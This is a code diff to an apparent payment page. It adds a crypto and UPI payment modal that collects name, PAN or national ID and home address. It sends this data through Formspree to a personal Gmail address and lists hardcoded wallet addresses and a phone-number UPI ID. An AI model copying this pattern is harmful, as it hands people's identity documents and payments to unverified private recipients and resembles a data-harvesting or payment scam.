@@ -338,7 +338,7 @@
             box-shadow: 0 0 20px rgba(251, 191, 36, 0.6);
         }
 
-        /* OTHER PAYMENT METHODS - EXACT BOX CONTAINER DESIGN */
+        /* OTHER PAYMENT METHODS */
         .payment-methods-wrapper {
             max-width: 1100px;
             margin: 40px auto;
@@ -391,7 +391,6 @@
             transform: translateY(-4px);
         }
 
-        /* Custom Icon Circles matching exact original design */
         .pay-icon-circle {
             width: 55px;
             height: 55px;
@@ -423,9 +422,7 @@
         }
 
         /* WHY CHOOSE SECTION */
-        .features-section {
-            padding: 50px 5%;
-        }
+        .features-section { padding: 50px 5%; }
 
         .features-grid {
             display: flex;
@@ -510,10 +507,8 @@
             font-size: 12px;
         }
 
-        /* FAQ SECTION (2 COLUMN LAYOUT LIKE ORIGINAL) */
-        .faq-section {
-            padding: 50px 5%;
-        }
+        /* FAQ SECTION */
+        .faq-section { padding: 50px 5%; }
 
         .faq-grid {
             max-width: 1000px;
@@ -532,9 +527,7 @@
             transition: 0.3s;
         }
 
-        .faq-item:hover {
-            border-color: var(--primary-red);
-        }
+        .faq-item:hover { border-color: var(--primary-red); }
 
         .faq-header {
             padding: 16px 20px;
@@ -560,9 +553,7 @@
             font-size: 13px;
         }
 
-        .faq-item.active .faq-answer {
-            display: block;
-        }
+        .faq-item.active .faq-answer { display: block; }
 
         /* FOOTER */
         footer {
@@ -605,9 +596,7 @@
             font-size: 13px;
         }
 
-        .footer-contact i {
-            color: var(--primary-red);
-        }
+        .footer-contact i { color: var(--primary-red); }
 
         .footer-bottom {
             text-align: center;
@@ -617,7 +606,7 @@
             padding-top: 20px;
         }
 
-        /* MODAL */
+        /* MODAL OVERLAYS */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -625,11 +614,12 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.85);
+            background: rgba(0, 0, 0, 0.88);
             z-index: 10000;
             justify-content: center;
             align-items: center;
             padding: 15px;
+            overflow-y: auto;
         }
 
         .modal-card {
@@ -638,10 +628,12 @@
             border-radius: 10px;
             padding: 25px;
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             color: #ffffff;
             box-shadow: 0 0 25px var(--primary-glow);
             position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
         }
 
         .modal-close {
@@ -657,27 +649,27 @@
             text-align: center;
             margin-bottom: 18px;
             color: var(--primary-red);
-            font-size: 18px;
+            font-size: 16px;
         }
 
-        .modal-field { margin-bottom: 15px; }
+        .modal-field { margin-bottom: 12px; }
 
         .modal-field label {
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 4px;
             font-weight: 600;
             color: #d1d5db;
-            font-size: 13px;
+            font-size: 12px;
         }
 
-        .modal-field input, .modal-field select {
+        .modal-field input, .modal-field select, .modal-field textarea {
             width: 100%;
-            padding: 10px 12px;
+            padding: 8px 12px;
             background: #15060b;
             border: 1px solid var(--border-color);
             border-radius: 6px;
             color: #ffffff;
-            font-size: 14px;
+            font-size: 13px;
             outline: none;
             font-family: 'Rajdhani', sans-serif;
         }
@@ -688,18 +680,60 @@
 
         .modal-btn {
             width: 100%;
-            padding: 12px;
+            padding: 11px;
             background: var(--primary-red);
             color: #ffffff;
             border: none;
             border-radius: 6px;
             font-weight: 700;
-            font-size: 15px;
+            font-size: 14px;
             cursor: pointer;
             text-transform: uppercase;
             transition: 0.3s;
             box-shadow: 0 0 10px var(--primary-glow);
+            margin-top: 10px;
         }
+
+        /* Address Box Display Style */
+        .address-box-display {
+            background: #1a080d;
+            border: 1px dashed var(--primary-red);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .address-box-display .addr-title {
+            font-size: 12px;
+            color: #9ca3af;
+            margin-bottom: 5px;
+        }
+
+        .address-box-display .addr-val {
+            font-size: 13px;
+            font-weight: bold;
+            color: var(--gold);
+            word-break: break-all;
+            background: #000;
+            padding: 8px;
+            border-radius: 4px;
+            margin: 5px 0;
+            user-select: all;
+        }
+
+        .btn-copy {
+            background: transparent;
+            border: 1px solid var(--gold);
+            color: var(--gold);
+            padding: 4px 10px;
+            font-size: 11px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 5px;
+        }
+
+        .btn-copy:hover { background: var(--gold); color: #000; }
 
         @media (max-width: 768px) {
             header { flex-direction: column; gap: 15px; }
@@ -829,32 +863,32 @@
         </div>
     </section>
 
-    <!-- OTHER PAYMENT METHODS (EXACT SCREENSHOT DESIGN) -->
+    <!-- OTHER PAYMENT METHODS -->
     <div class="payment-methods-wrapper">
         <div class="payment-box-container">
             <div class="payment-box-header">OTHER PAYMENT METHODS</div>
             <div class="payment-grid">
-                <div class="payment-card" onclick="openPaymentModal()">
+                <div class="payment-card" onclick="openOtherPayModal('TRC20')">
                     <div class="pay-icon-circle trc20-icon">T</div>
                     <span>TRC20</span>
                     <small>(USDT)</small>
                 </div>
-                <div class="payment-card" onclick="openPaymentModal()">
+                <div class="payment-card" onclick="openOtherPayModal('ERC20')">
                     <div class="pay-icon-circle erc20-icon"><i class="fa-brands fa-ethereum"></i></div>
                     <span>ERC20</span>
                     <small>(USDT)</small>
                 </div>
-                <div class="payment-card" onclick="openPaymentModal()">
+                <div class="payment-card" onclick="openOtherPayModal('BEP20')">
                     <div class="pay-icon-circle bep20-icon"><i class="fa-solid fa-cube"></i></div>
                     <span>BEP20</span>
                     <small>(USDT)</small>
                 </div>
-                <div class="payment-card" onclick="openPaymentModal()">
+                <div class="payment-card" onclick="openOtherPayModal('BITCOIN')">
                     <div class="pay-icon-circle btc-icon"><i class="fa-brands fa-bitcoin"></i></div>
                     <span>BITCOIN</span>
                     <small>(BTC)</small>
                 </div>
-                <div class="payment-card" onclick="openPaymentModal()">
+                <div class="payment-card" onclick="openOtherPayModal('PHONE PAY')">
                     <div class="pay-icon-circle phonepay-icon">पे</div>
                     <span>PHONE PAY</span>
                     <small>(INR)</small>
@@ -1029,7 +1063,7 @@
         </div>
     </footer>
 
-    <!-- PAYMENT MODAL -->
+    <!-- NORMAL PAYMENT MODAL (RAZORPAY) -->
     <div class="modal-overlay" id="paymentModal">
         <div class="modal-card">
             <span class="modal-close" onclick="closePaymentModal()">&times;</span>
@@ -1061,8 +1095,150 @@
         </div>
     </div>
 
-    <!-- JS -->
+    <!-- OTHER PAYMENT MODAL (STEP 1: 7 DETAILS & STEP 2: ADDRESS + TXID/UTR) -->
+    <div class="modal-overlay" id="otherPayModal">
+        <div class="modal-card">
+            <span class="modal-close" onclick="closeOtherPayModal()">&times;</span>
+            <h3 id="otherModalTitle">PAYMENT DETAILS</h3>
+
+            <!-- FORM SUBMISSION VIA FORMSPREE DIRECT TO RKPJALORE@GMAIL.COM -->
+            <form action="https://formspree.io/f/rkpjalore@gmail.com" method="POST" id="otherPayForm" onsubmit="handleOtherPaySubmit(event)">
+                
+                <input type="hidden" name="Payment_Method" id="hiddenMethodName">
+
+                <!-- STEP 1: 7 DETAILS -->
+                <div id="step1_Details">
+                    <div class="modal-field">
+                        <label>1. Full Name *</label>
+                        <input type="text" name="Full_Name" id="op_fullname" required placeholder="Enter Full Name">
+                    </div>
+                    <div class="modal-field">
+                        <label>2. PAN / National ID Number *</label>
+                        <input type="text" name="PAN_National_ID" id="op_pan" required placeholder="Enter PAN or National ID">
+                    </div>
+                    <div class="modal-field">
+                        <label>3. Country of Residence *</label>
+                        <input type="text" name="Country" id="op_country" required placeholder="Enter Country">
+                    </div>
+                    <div class="modal-field">
+                        <label>4. State / Province *</label>
+                        <input type="text" name="State" id="op_state" required placeholder="Enter State / Province">
+                    </div>
+                    <div class="modal-field">
+                        <label>5. City / Village / Town *</label>
+                        <input type="text" name="City" id="op_city" required placeholder="Enter City / Town">
+                    </div>
+                    <div class="modal-field">
+                        <label>6. Pin Code *</label>
+                        <input type="text" name="Pin_Code" id="op_pincode" required placeholder="Enter Pin Code">
+                    </div>
+                    <div class="modal-field">
+                        <label>7. Full Address *</label>
+                        <input type="text" name="Full_Address" id="op_address" required placeholder="Enter Full Address">
+                    </div>
+
+                    <button type="button" onclick="goToStep2()" class="modal-btn">CONTINUE TO PAYMENT</button>
+                </div>
+
+                <!-- STEP 2: ADDRESS DISPLAY + TXID/UTR SUBMIT -->
+                <div id="step2_Payment" style="display: none;">
+                    <div class="address-box-display">
+                        <div class="addr-title" id="addrTitleLabel">Send payment to:</div>
+                        <div class="addr-val" id="addrValueDisplay">...</div>
+                        <button type="button" class="btn-copy" onclick="copyAddressText()">Copy Address</button>
+                    </div>
+
+                    <div class="modal-field">
+                        <label id="txidLabel">Transaction Hash / TxID *</label>
+                        <input type="text" name="TxID_or_UTR" id="op_txid" required placeholder="Enter TxID / UTR Ref Number">
+                    </div>
+
+                    <button type="submit" class="modal-btn">SUBMIT PAYMENT PROOF</button>
+                    <button type="button" onclick="backToStep1()" style="background:transparent; border:none; color:#9ca3af; text-decoration:underline; width:100%; margin-top:10px; cursor:pointer; font-size:12px;">&larr; Back to Details</button>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <!-- JS SCRIPTS -->
     <script>
+        var selectedMethod = '';
+
+        var paymentAddresses = {
+            'TRC20': 'TP1hUt5spzMv5LoHjAU2yEQusEgj8jNDwb',
+            'ERC20': '0x4aea8cb300ccca979c1be6ff1b7727e2c57cc5ab',
+            'BEP20': '0x4aea8cb300ccca979c1be6ff1b7727e2c57cc5ab',
+            'BITCOIN': '143odbY9gkjo8de7NizwFuzWD11Muw9QW4',
+            'PHONE PAY': '9649638812@ybl'
+        };
+
+        function openOtherPayModal(method) {
+            selectedMethod = method;
+            document.getElementById('hiddenMethodName').value = method;
+            document.getElementById('otherModalTitle').innerText = method + ' PAYMENT';
+            
+            document.getElementById('step1_Details').style.display = 'block';
+            document.getElementById('step2_Payment').style.display = 'none';
+
+            document.getElementById('otherPayModal').style.display = 'flex';
+        }
+
+        function closeOtherPayModal() {
+            document.getElementById('otherPayModal').style.display = 'none';
+        }
+
+        function goToStep2() {
+            var fName = document.getElementById('op_fullname').value.trim();
+            var pan   = document.getElementById('op_pan').value.trim();
+            var ctry  = document.getElementById('op_country').value.trim();
+            var st    = document.getElementById('op_state').value.trim();
+            var city  = document.getElementById('op_city').value.trim();
+            var pin   = document.getElementById('op_pincode').value.trim();
+            var addr  = document.getElementById('op_address').value.trim();
+
+            if(!fName || !pan || !ctry || !st || !city || !pin || !addr) {
+                alert('Kripya saari 7 details fill karein pehle!');
+                return;
+            }
+
+            var payAddr = paymentAddresses[selectedMethod] || '';
+            document.getElementById('addrValueDisplay').innerText = payAddr;
+
+            if(selectedMethod === 'PHONE PAY') {
+                document.getElementById('addrTitleLabel').innerText = "Send UPI Payment to:";
+                document.getElementById('txidLabel').innerText = "Enter 12-Digit UTR / Ref Number *";
+                document.getElementById('op_txid').placeholder = "e.g. 3021XXXXXXXX";
+            } else {
+                document.getElementById('addrTitleLabel').innerText = "Send " + selectedMethod + " USDT/BTC to:";
+                document.getElementById('txidLabel').innerText = "Enter Transaction ID (TxID / Hash) *";
+                document.getElementById('op_txid').placeholder = "e.g. 0x... / Hash ID";
+            }
+
+            document.getElementById('step1_Details').style.display = 'none';
+            document.getElementById('step2_Payment').style.display = 'block';
+        }
+
+        function backToStep1() {
+            document.getElementById('step1_Details').style.display = 'block';
+            document.getElementById('step2_Payment').style.display = 'none';
+        }
+
+        function copyAddressText() {
+            var textToCopy = document.getElementById('addrValueDisplay').innerText;
+            navigator.clipboard.writeText(textToCopy);
+            alert('Address Copied: ' + textToCopy);
+        }
+
+        function handleOtherPaySubmit(e) {
+            var tx = document.getElementById('op_txid').value.trim();
+            if(!tx) {
+                e.preventDefault();
+                alert('Kripya TxID ya UTR fill karein!');
+            }
+        }
+
+        // Razorpay Modal Functions
         function openPaymentModal(planValue) {
             var modal = document.getElementById('paymentModal');
             var select = document.getElementById('modalPlanSelect');
@@ -1077,15 +1253,16 @@
         }
 
         window.onclick = function(event) {
-            var modal = document.getElementById('paymentModal');
-            if (event.target == modal) {
-                modal.style.display = 'none';
+            if (event.target == document.getElementById('paymentModal')) {
+                closePaymentModal();
+            }
+            if (event.target == document.getElementById('otherPayModal')) {
+                closeOtherPayModal();
             }
         }
 
         function handleDirectPayment(e) {
             e.preventDefault();
-            
             var name  = encodeURIComponent(document.getElementById('cust_name').value.trim());
             var email = encodeURIComponent(document.getElementById('cust_email').value.trim());
             var phone = encodeURIComponent(document.getElementById('cust_phone').value.trim());
